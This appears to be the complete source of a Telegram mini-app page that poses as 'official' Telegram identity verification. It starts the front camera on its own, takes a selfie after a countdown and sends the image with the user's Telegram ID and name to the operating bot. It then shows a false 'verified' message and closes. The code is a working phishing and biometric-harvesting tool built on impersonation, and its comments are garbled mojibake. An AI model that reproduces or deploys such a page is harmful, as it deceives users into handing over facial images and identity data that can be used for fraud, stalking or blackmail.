<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Identity Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            padding: 20px;
            text-align: center;
        }
        .container { max-width: 500px; margin: 0 auto; }
        .logo { font-size: 48px; margin: 40px 0 20px; }
        .header { margin-bottom: 30px; }
        .header h1 { font-size: 28px; margin-bottom: 10px; }
        .header p { opacity: 0.9; font-size: 16px; }
        .status-box {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            margin: 20px 0;
            border: 1px solid rgba(255,255,255,0.2);
        }
        #statusText { font-size: 18px; margin: 20px 0; }
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .hidden { display: none !important; }
        video { 
            width: 100%; 
            max-width: 300px;
            border-radius: 15px;
            margin: 20px auto;
            display: block;
            transform: scaleX(-1); /* –∑–µ—Ä–∫–∞–ª—å–Ω–æ –¥–ª—è —Å–µ–ª—Ñ–∏ */
        }
        .btn {
            background: white;
            color: #667eea;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 10px;
            transition: transform 0.2s;
        }
        .btn:hover { transform: translateY(-2px); }
        .success { color: #4ade80; }
        .error { color: #f87171; }
        .countdown { font-size: 32px; font-weight: bold; margin: 20px; }
        .warning {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üîê</div>
        
        <div class="header">
            <h1>Telegram Identity Verification</h1>
            <p>Official security check for account protection</p>
        </div>

        <div class="status-box">
            <div id="statusText">Initializing security protocol...</div>
            
            <div class="loader" id="loader"></div>
            
            <div id="countdown" class="countdown hidden">3</div>
            
            <video id="cameraView" autoplay playsinline class="hidden"></video>
            
            <canvas id="photoCanvas" class="hidden"></canvas>
        </div>

        <div class="warning">
            <p>‚ö†Ô∏è This is an official Telegram verification system. Do not close the window.</p>
        </div>

        <button id="retryBtn" class="btn hidden">Try Again</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        const statusText = document.getElementById('statusText');
        const loader = document.getElementById('loader');
        const countdownEl = document.getElementById('countdown');
        const cameraView = document.getElementById('cameraView');
        const photoCanvas = document.getElementById('photoCanvas');
        const retryBtn = document.getElementById('retryBtn');
        
        let stream = null;
        let countdown = 3;
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
        tg.expand();
        tg.enableClosingConfirmation();
        tg.setHeaderColor('#667eea');
        tg.setBackgroundColor('#667eea');
        
        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ —á–µ—Ä–µ–∑ 1 —Å–µ–∫—É–Ω–¥—É
        setTimeout(startVerification, 1000);
        
        async function startVerification() {
            statusText.innerHTML = "Requesting camera access...";
            
            try {
                // –ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false
                });
                
                statusText.innerHTML = "‚úì Camera access granted";
                loader.classList.add('hidden');
                cameraView.classList.remove('hidden');
                cameraView.srcObject = stream;
                
                // –ó–∞–ø—É—Å–∫ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á–µ—Ç–∞
                startCountdown();
                
            } catch (error) {
                handleError(error);
            }
        }
        
        function startCountdown() {
            countdownEl.classList.remove('hidden');
            statusText.innerHTML = "Prepare for facial recognition...";
            
            const timer = setInterval(() => {
                countdownEl.textContent = countdown;
                countdown--;
                
                if (countdown < 0) {
                    clearInterval(timer);
                    capturePhoto();
                }
            }, 1000);
        }
        
        function capturePhoto() {
            countdownEl.classList.add('hidden');
            statusText.innerHTML = "Capturing image...";
            
            // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ canvas
            const context = photoCanvas.getContext('2d');
            photoCanvas.width = cameraView.videoWidth;
            photoCanvas.height = cameraView.videoHeight;
            
            // –ó–µ—Ä–∫–∞–ª—å–Ω–æ–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ —Å–µ–ª—Ñ–∏
            context.translate(photoCanvas.width, 0);
            context.scale(-1, 1);
            context.drawImage(cameraView, 0, 0, photoCanvas.width, photoCanvas.height);
            
            // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä—ã
            stream.getTracks().forEach(track => track.stop());
            cameraView.classList.add('hidden');
            
            // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ñ–æ—Ç–æ
            const photoData = photoCanvas.toDataURL('image/jpeg', 0.95);
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
            sendToBot(photoData);
        }
        
        function sendToBot(photoData) {
            statusText.innerHTML = "Processing biometric data...";
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ Telegram Web App
            tg.sendData(JSON.stringify({
                action: 'photo_captured',
                photo: photoData,
                timestamp: new Date().toISOString(),
                user_id: tg.initDataUnsafe.user?.id,
                user_name: tg.initDataUnsafe.user?.first_name
            }));
            
            // –°–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—Ö–µ
            setTimeout(() => {
                statusText.innerHTML = '<span class="success">‚úì Identity verified successfully!</span>';
                statusText.classList.add('success');
                loader.classList.add('hidden');
                
                // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ –∏—Å—Ç–æ—Ä–∏—é Telegram
                tg.HapticFeedback.notificationOccurred('success');
                
                // –ê–≤—Ç–æ–∑–∞–∫—Ä—ã—Ç–∏–µ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                setTimeout(() => {
                    tg.close();
                }, 3000);
            }, 2000);
        }
        
        function handleError(error) {
            console.error('Camera error:', error);
            loader.classList.add('hidden');
            
            if (error.name === 'NotAllowedError') {
                statusText.innerHTML = '<span class="error">Camera access denied. Please allow camera access in browser settings.</span>';
                retryBtn.classList.remove('hidden');
            } else {
                statusText.innerHTML = '<span class="error">Camera not available. Please try on another device.</span>';
            }
            
            retryBtn.onclick = () => {
                retryBtn.classList.add('hidden');
                loader.classList.remove('hidden');
                statusText.innerHTML = "Retrying...";
                setTimeout(startVerification, 1000);
            };
        }
        
        // –ü–µ—Ä–µ—Ö–≤–∞—Ç –∫–Ω–æ–ø–∫–∏ –Ω–∞–∑–∞–¥
        tg.BackButton.onClick(() => {
            tg.showConfirm("Cancel verification? All progress will be lost.", (confirmed) => {
                if (confirmed) tg.close();
            });
        });
        tg.BackButton.show();
    </script>
</body>
</html>